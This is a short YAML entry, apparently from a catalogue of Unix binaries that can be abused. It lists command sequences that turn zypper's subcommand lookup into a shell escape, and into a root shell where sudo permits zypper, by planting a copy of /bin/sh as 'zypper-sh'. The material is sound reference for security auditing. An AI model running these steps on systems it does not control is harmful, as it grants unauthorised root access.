---
functions:
  shell:
    - description: Executables whose name begin by "zypper-" in the zypper_execdir (/usr/lib/zypper/commands) can be used as zypper subcommands.
      code: |
        cp /bin/sh /usr/lib/zypper/commands/zypper-sh
        zypper sh
    - description: Executables whose name begin by "zypper-" in the $PATH can be used as zypper subcommands.
      code: |
        mkdir /tmp/foo
        cp /bin/sh /tmp/foo/zypper-sh
        export PATH=/tmp/foo:$PATH
        zypper sh
  sudo:
    - description: Executables whose name begin by "zypper-" in the zypper_execdir (/usr/lib/zypper/commands) can be used as zypper subcommands.
      code: |
        cp /bin/sh /usr/lib/zypper/commands/zypper-sh
        sudo zypper sh
    - description: Executables whose name begin by "zypper-" in the $PATH can be used as zypper subcommands. Environment variables can be set using sudo VAR=value.
      code: |
        mkdir /tmp/foo
        cp /bin/sh /tmp/foo/zypper-sh
        sudo PATH=/tmp/foo zypper sh
    - description: Executables whose name begin by "zypper-" in the $PATH can be used as zypper subcommands. Environment can be preserved using sudo -E.
      code: |
        mkdir /tmp/foo
        cp /bin/sh /tmp/foo/zypper-sh
        export PATH=/tmp/foo:$PATH
        sudo -E zypper sh
---
